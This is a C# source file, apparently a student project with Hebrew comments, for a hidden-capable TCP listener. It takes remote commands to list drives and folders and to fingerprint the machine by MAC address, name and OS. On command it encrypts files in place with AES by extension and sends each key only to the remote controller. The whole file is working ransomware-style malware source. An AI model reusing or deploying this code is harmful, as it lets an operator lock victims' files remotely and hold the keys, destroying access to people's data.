using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Web;
using System.IO;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;

namespace ListenerEnc
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        //מאפשרים את הסתרת חלון התוכנית

        private const int BUFSIZE = 1024; // Size of receive buffer
        public static bool flag = false;
        public static byte[] Iterate(string path)//פעולה שתפקידה להחזיר את הקבצים והתיקיות שנמצאים בנתיב שנשלח
        {
            string paths = null;
            try
            {
                DirectoryInfo DI = new DirectoryInfo(path);
                foreach (FileInfo FI in DI.GetFiles("*", SearchOption.TopDirectoryOnly))
                {
                    paths += "FILE:" + FI.FullName + "   ";
                }
                foreach (DirectoryInfo I in DI.GetDirectories("*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        paths += "DIRE:" + I.FullName + "   ";
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception E)
            {
                Console.WriteLine(E.Message);
                return Encoding.UTF8.GetBytes("Exception");
            }
            if (paths == null)
            {
                return Encoding.UTF8.GetBytes(paths);
            }
            return Encoding.UTF8.GetBytes(paths);
        }
        public static byte[] IterateEN(string path, NetworkStream netStream, List<string> Extensions)//פעולה שתפקידה להצפין את הקבצים שנמצאים בנתיב שנשלח על פי הסיומות ברשימה
        {
            string paths = null;
            FileAttributes attr = File.GetAttributes(path);
            if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
            {
                DirectoryInfo DI = new DirectoryInfo(path);
                foreach (FileInfo FI in DI.GetFiles("*", SearchOption.TopDirectoryOnly))
                {
                    if (Extensions.Count() == 0 || Extensions.Exists(T => T.Equals(Path.GetExtension(FI.FullName), StringComparison.InvariantCultureIgnoreCase)))
                    {
                        string s = Encrypt(FI.FullName, netStream);
                        paths += s;
                    }
                }
            }
            else
            {
                if (Extensions.Count() == 0 || Extensions.Exists(T => T.Equals(Path.GetExtension(path), StringComparison.InvariantCultureIgnoreCase)))
                {
                    string s = Encrypt(path, netStream);
                    paths += s;
                }
            }
            return Encoding.UTF8.GetBytes("FINISHED");//שליחה במקרה של סיום הצפנת כל הקבצים שנמצאו
        }
        public static byte[] IterateDE(string path, NetworkStream netStream)//פעולה שתפקידה לפענח את הקבצים שנמצאים בנתיב שנשלח
        {
            string paths = null;
            if (!path.Contains('.'))
            {
                DirectoryInfo DI = new DirectoryInfo(path);
                foreach (FileInfo FI in DI.GetFiles("*", SearchOption.TopDirectoryOnly))
                {
                    string s = Decrypt(FI.FullName, netStream);
                    paths += s;
                    Console.WriteLine(s);
                }
            }
            else
            {
                string s = Decrypt(path, netStream);
                paths += s;
                Console.WriteLine(s);
            }
            string r = "FINISHED ";
            foreach (string s in Failed)
            {
                r += s + " ";
            }
            return Encoding.UTF8.GetBytes(r);//שליחה במקרה של סיום פענוח הקבצים שנמצאו והשגיאות שחלו
        }
        static Random r = new Random();
        public static string RandomString(int length)//פעולה שיוצרת מחרוזות רנדומליות שישמשו ליצירת המפתחות להצפנת הקבצים
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-=";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[r.Next(s.Length)]).ToArray());
        }
        public static string Encrypt(string inputFilePath, NetworkStream netStream)//הפעולה שאחראית על הצפנת הקובץ ושליחת פרטי ההצפנה בחזרה לממשק
        {
            try
            {

                int maxsize = MTU - 16 - 2 - Encoding.UTF8.GetByteCount(inputFilePath);
                string skey = RandomString(maxsize / 2);
                string salt = RandomString(maxsize / 2);
                //על מנת שהמידע יוכל להשלח על גבי הסטרים
                if (!File.Exists(Path.GetDirectoryName(inputFilePath) + "\\temp"))
                {
                    File.Create(Path.GetDirectoryName(inputFilePath) + "\\temp").Close();
                }
                else
                {
                    File.Delete(Path.GetDirectoryName(inputFilePath) + "\\temp");
                    File.Create(Path.GetDirectoryName(inputFilePath) + "\\temp").Close();
                }
                //יצירת קובץ זמני שבו הבייטים המוצפנים ימצאו עד החלפת הקובץ בקובץ המקורי
                using (Aes encryptor = Aes.Create())//התחלת תהליך ההצפנה
                {

                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(skey, Encoding.UTF8.GetBytes(salt));
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    //IVיצירת המפתח וה 
                    //שישמשו בתהליך ההצפנה על פי המחרוזות הרנדומליות ממקודם
                    using (FileStream fsOutput = new FileStream(Path.GetDirectoryName(inputFilePath) + "\\temp", FileMode.Create))//יצירת סטרים שקורא את הקובץ שמצפינים
                    {
                        using (CryptoStream cs = new CryptoStream(fsOutput, encryptor.CreateEncryptor(), CryptoStreamMode.Write))//יצירת סטרים שמצפין את הבייטים שנקראים
                        {
                            using (FileStream fsInput = new FileStream(inputFilePath, FileMode.Open))//יצירת סטרים שכותב את הבייטים המוצפנים בקובץ הזמני
                            {
                                int data;
                                while ((data = fsInput.ReadByte()) != -1)
                                {
                                    cs.WriteByte((byte)data);
                                }
                            }
                            cs.Flush();
                        }

                    }
                }

                File.Replace(Path.GetDirectoryName(inputFilePath) + "\\temp", inputFilePath, null);
                Console.WriteLine("YES:" + inputFilePath);
                //החלפת הקובץ המקורי בקובץ הזמני
                byte[] send = Encoding.UTF8.GetBytes("YES:" + inputFilePath + "   " + skey + "   " + salt + "   ");
                netStream.Write(send, 0, send.Length);
                //שליחת אישור על הצלחת ההצפנה
                while (!netStream.DataAvailable)
                {

                }
                byte[] reader = new byte[1024];
                netStream.Read(reader, 0, reader.Length);
                return "YES:" + inputFilePath + "   " + skey + "   " + salt + "   ";
            }
            catch (Exception E)
            {
                Console.WriteLine(E.Message);
                File.Delete(Path.GetDirectoryName(inputFilePath) + "\\temp");
                byte[] send = Encoding.UTF8.GetBytes("NOO:" + inputFilePath);
                netStream.Write(send, 0, send.Length);
                //שליחה שההצפנה לא התבצעה בהצלחה עקב שגיאה
                while (!netStream.DataAvailable)
                {

                }
                byte[] reader = new byte[1024];
                netStream.Read(reader, 0, reader.Length);
                return "NOO:" + inputFilePath;
            }
        }
        static List<string> Failed = new List<string>();//רשימה שאוספת את השגיאות להדפסה מאוחרת
        public static string Decrypt(string inputFilePath, NetworkStream netStream)//הפעולה שאחראית על פענוח הקובץ
        {
            try
            {
                byte[] rcvBuffer = new byte[2048];
                byte[] send = Encoding.UTF8.GetBytes(inputFilePath);
                int bytesRcvd = 0;
                int totalbytesrcv = 0;
                netStream.Write(send, 0, send.Length);
                string s = null;
                while (!netStream.DataAvailable)
                {
                }
                while (netStream.DataAvailable)
                {
                    rcvBuffer = new byte[2048];
                    bytesRcvd = netStream.Read(rcvBuffer, 0, rcvBuffer.Length);
                    totalbytesrcv += bytesRcvd;
                    byte[] clean = rcvBuffer.Take(bytesRcvd).ToArray();
                    s += Encoding.UTF8.GetString(clean);
                }
                //קבלת המחרוזות שבהן נעשה שימוש להצפין את הקובץ ממסד הנתונים אצל הממשק
                netStream.Flush();
                s.ToString();
                if (s.Substring(0, 4).Equals("YES:"))
                {
                    List<string> seperators = new List<string>();
                    seperators.Add("   ");
                    List<string> Names = s.Split(seperators.ToArray(), StringSplitOptions.RemoveEmptyEntries).ToList();
                    byte[] oz = Encoding.UTF8.GetBytes(Names[0].Remove(0, 4));
                    string password = Encoding.UTF8.GetString(oz);
                    byte[] salt = Encoding.UTF8.GetBytes(Names[1]);
                    //לקיחת המחרוזות מתוך המידע שנשלח
                    using (Aes encryptor = Aes.Create())//התחלת הפענוח של הקובץ
                    {
                        if (!File.Exists(Path.GetDirectoryName(inputFilePath) + "\\temp"))
                        {
                            File.Create(Path.GetDirectoryName(inputFilePath) + "\\temp").Close();
                        }
                        else
                        {
                            File.Delete(Path.GetDirectoryName(inputFilePath) + "\\temp");
                            File.Create(Path.GetDirectoryName(inputFilePath) + "\\temp").Close();
                        }
                        //יצירת הקובץ הזמני
                        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, salt);
                        encryptor.Key = pdb.GetBytes(32);
                        encryptor.IV = pdb.GetBytes(16);
                        //IVיצירת המפתח וה 
                        //שישמשו בתהליך הפענוח על פי המחרוזות שנשלחו מן הממשק 
                        using (FileStream fsInput = new FileStream(inputFilePath, FileMode.Open))//יצירת הסטרים לקריאת הקובץ 
                        {
                            using (CryptoStream cs = new CryptoStream(fsInput, encryptor.CreateDecryptor(), CryptoStreamMode.Read))//יצירת הסטרים לפענוח הבייטים
                            {
                                using (FileStream fsOutput = new FileStream(Path.GetDirectoryName(inputFilePath) + "\\temp", FileMode.Create))//יצירת סטרים לכתיבת הבייטים המפוענחים לקובץ הזמני
                                {
                                    int data;
                                    while ((data = cs.ReadByte()) != -1)
                                    {
                                        fsOutput.WriteByte((byte)data);
                                    }
                                }
                                cs.Flush();
                            }
                        }
                        File.Replace(Path.GetDirectoryName(inputFilePath) + "\\temp", inputFilePath, null);
                        return "YES:" + inputFilePath;
                        //שליחת אישור על פענוח הקובץ
                    }
                }
                else
                {
                    Failed.Add(inputFilePath);
                    File.Delete(Path.GetDirectoryName(inputFilePath) + "\\temp");
                    return "NOO:" + inputFilePath;
                }
                //הקובץ לא נמצא במאגר
            }
            catch (Exception E)
            {
                Failed.Add(inputFilePath);
                Console.WriteLine(E.Message);
                File.Delete(Path.GetDirectoryName(inputFilePath) + "\\temp");
                return "NOO:" + inputFilePath;
            }
            //מקרי שגיאה
        }
        public static string DecryptWith(string inputFilePath, string password, byte[] salt)//פענוח של הקבצים בחלון הקבצים המוצפנים זהה כמעט לפענוח הרגיל רק שאין בקשה של המחרוזות מהממשק
        {
            try
            {
                using (Aes encryptor = Aes.Create())
                {
                    if (!File.Exists(Path.GetDirectoryName(inputFilePath) + "\\temp"))
                    {
                        File.Create(Path.GetDirectoryName(inputFilePath) + "\\temp").Close();
                    }
                    else
                    {
                        File.Delete(Path.GetDirectoryName(inputFilePath) + "\\temp");
                        File.Create(Path.GetDirectoryName(inputFilePath) + "\\temp").Close();
                    }
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, salt);
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (FileStream fsInput = new FileStream(inputFilePath, FileMode.Open))
                    {
                        using (CryptoStream cs = new CryptoStream(fsInput, encryptor.CreateDecryptor(), CryptoStreamMode.Read))
                        {
                            using (FileStream fsOutput = new FileStream(Path.GetDirectoryName(inputFilePath) + "\\temp", FileMode.Create))
                            {
                                int data;
                                while ((data = cs.ReadByte()) != -1)
                                {
                                    fsOutput.WriteByte((byte)data);
                                }
                            }
                            cs.Flush();
                        }
                    }
                    File.Replace(Path.GetDirectoryName(inputFilePath) + "\\temp", inputFilePath, null);
                    return "YES:" + inputFilePath;
                }
            }
            catch (Exception E)
            {
                Failed.Add(inputFilePath);
                Console.WriteLine(E.Message);
                File.Delete(Path.GetDirectoryName(inputFilePath) + "\\temp");
                return "NOO:" + inputFilePath;
            }
        }
        public static byte[] Drives()//שליחת הכוננים שנמצאים במחשב
        {
            string s = null;
            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                if (d.DriveType != DriveType.CDRom)
                {
                    s += d.Name + "   ";
                }
            }
            return Encoding.UTF8.GetBytes(s);
        }
        static byte[] Operate(string cmd, NetworkStream netStream)//הפעולה העיקרית שתפקידה לנתח את הבקשות מן הממשק ולפעול על פיהן
        {
            string First = cmd.Substring(0, 5);
            //Headerלקיחת ה
            //שמסמל את סוג הבקשה שנשלחה ע"י הממשק
            byte[] returns = null;
            switch (First)
            {
                case "ASDE:"://DecryptWith בקשת פענוח הקבצים הספציפים ושימוש בפעולת 
                    {
                        string s = cmd.Substring(5);
                        List<string> seperators = new List<string>();
                        seperators.Add("   ");
                        List<string> Names = s.Split(seperators.ToArray(), StringSplitOptions.RemoveEmptyEntries).ToList();
                        string path = Names[0];
                        string password = Names[1];
                        byte[] salt = Encoding.UTF8.GetBytes(Names[2]);
                        returns = Encoding.UTF8.GetBytes(DecryptWith(path, password, salt));
                    }
                    break;
                case "MARCO":// בקשת דיבוג
                    {
                        returns = Encoding.UTF8.GetBytes("POLO");
                    }
                    break;
                case "PATH:"://Iterateבקשת חיפוש נתיב שימוש בפעולת
                    {
                        string path = cmd.Substring(5);
                        returns = Iterate(path);
                    }
                    break;
                case "ENCR:"://IterateENבקשת הצפנה שימוש בפעולת
                    {
                        string s = cmd.Substring(5);
                        List<string> seperators = new List<string>();
                        seperators.Add("   ");
                        List<string> Names = s.Split(seperators.ToArray(), StringSplitOptions.RemoveEmptyEntries).ToList();
                        string path = Names[0];
                        Names.Remove(Names.First());
                        Stopwatch SW = new Stopwatch();
                        SW.Start();
                        returns = IterateEN(path, netStream, Names);
                        SW.Stop();
                        Console.WriteLine(Encoding.UTF8.GetString(returns));
                        Console.WriteLine(SW.Elapsed);
                    }
                    break;
                case "DECR:"://IterateDEבקשת פענוח שימוש בפעולת
                    {
                        Failed = new List<string>();
                        string path = cmd.Substring(5);
                        returns = IterateDE(path, netStream);
                    }
                    break;
                case "DRIV:"://בקשת חיפוש הכוננים
                    {
                        returns = Drives();
                    }
                    break;
                case "FIRS:"://הבקשה הראשונה שנשלחת ביצירת קשר ותפקידה לבקש מידע לצורך זיהוי המחשב והכנסתו למסד הנתונים
                    {
                        returns = Encoding.UTF8.GetBytes(GetMAC() + "   " + Environment.MachineName + "   " + Environment.OSVersion);
                    }
                    break;
            }
            return returns;
        }
        static void Main(string[] args)
        {
            //ShowWindow(GetConsoleWindow(), SW_HIDE);//החבאת החלון
            int servPort = 40035;//הפורט שלו התוכנית מאזינה
            TcpListener listener = null;
            try
            {
                listener = new TcpListener(IPAddress.Any, servPort);
                listener.Start();
            }
            //יצירת מאזין
            catch (SocketException se)
            {
                Console.WriteLine(se.ErrorCode + ": " + se.Message);
                Environment.Exit(se.ErrorCode);
            }
            byte[] rcvBuffer = new byte[BUFSIZE];
            int bytesRcvd = 0;
            TcpClient client = null;
            NetworkStream netStream = null;
            for (;;)
            {
                try
                {
                    byte[] byteBuffer = Encoding.UTF8.GetBytes("");
                    client = listener.AcceptTcpClient();//המתנה ליצירת קשר בפורט               
                    netStream = client.GetStream();
                    string ToStringFromBytes = "";
                    int totalBytesEchoed = 0;
                    bytesRcvd = 0;
                    rcvBuffer = new byte[BUFSIZE];
                    while (!netStream.DataAvailable)
                    {
                    }
                    //המתנה לבקשה
                    while (netStream.DataAvailable)
                    {
                        rcvBuffer = new byte[BUFSIZE];
                        bytesRcvd = netStream.Read(rcvBuffer, 0, rcvBuffer.Length);
                        byte[] clean = rcvBuffer.Take(bytesRcvd).ToArray();
                        ToStringFromBytes += Encoding.UTF8.GetString(clean);
                        totalBytesEchoed += bytesRcvd;
                    }
                    //קריאת הבקשה מהסטרים
                    netStream.Flush();
                    Console.WriteLine("echoed {0} bytes.", totalBytesEchoed);
                    Console.WriteLine(ToStringFromBytes);
                    byteBuffer = Operate(ToStringFromBytes, netStream);//שליחת הבקשה לOperate
                    ToStringFromBytes = Encoding.UTF8.GetString(byteBuffer);
                    netStream.Write(byteBuffer, 0, byteBuffer.Length);//שליחת הפלט שהתקבל מOperate
                    while (netStream.DataAvailable)
                    {
                    }
                    netStream.Close();
                    client.Close();
                    //סגירת הקשר עם הממשק והתחלת ההאזנה לפורט
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    client.Close();
                    netStream.Close();
                }
            }
        }
        static string GetMAC()
        {
            ManagementObjectSearcher query = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = 'TRUE'");
            ManagementObjectCollection queryCollection = query.Get();
            foreach (ManagementObject mo in queryCollection)
            {
                return (string)mo["MACAddress"];
            }
            return null;
        }
        //MACהשגת כתובת ה
        //שימוש ב Management API
        static int MTU = GetMTU();
        public static int GetMTU()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            foreach (NetworkInterface adapter in nics)
            {
                // Only display informatin for interfaces that support IPv4.
                if (adapter.Supports(NetworkInterfaceComponent.IPv4) == false)
                {
                }
                IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
                // Try to get the IPv4 interface properties.
                IPv4InterfaceProperties p = adapterProperties.GetIPv4Properties();

                if (p == null)
                {
                }
                return p.Mtu;
            }
            return 1000;
        }
        //MTUהשגת ה
        //על מנת הקצבת כמות מקסימלית של בייטים על הסטרים
    }
}